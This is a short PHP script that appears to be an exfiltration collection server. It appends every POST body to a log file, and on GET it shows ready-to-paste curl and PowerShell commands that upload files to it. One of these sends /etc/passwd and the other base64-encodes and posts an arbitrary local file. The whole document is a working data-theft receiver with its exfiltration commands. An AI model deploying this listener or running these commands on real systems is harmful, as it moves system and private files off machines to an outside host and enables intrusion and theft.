<?php

if($_POST) {
  $req_dump = var_export($_POST, true);
  $f = fopen('/data/dump.log', 'a');
  fwrite($f, $req_dump);
  fclose($f); 
}
else {
  $url = $_SERVER['SERVER_NAME'] . ":" . $_SERVER['SERVER_PORT'] . '/dump'
?>
<html>
<head></head>
<body>
<p>
Send files with curl:
<pre>
curl -XPOST -d @/etc/passwd http://<?php echo $url ?>
</pre>
or PowerShell
<pre>
Invoke-WebRequest -Uri http://<?php echo $url ?> -Method Post -Body @{'file' = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\to\file.txt"))}
</pre>
</p>
</body>
</html>
<?php
}
?>
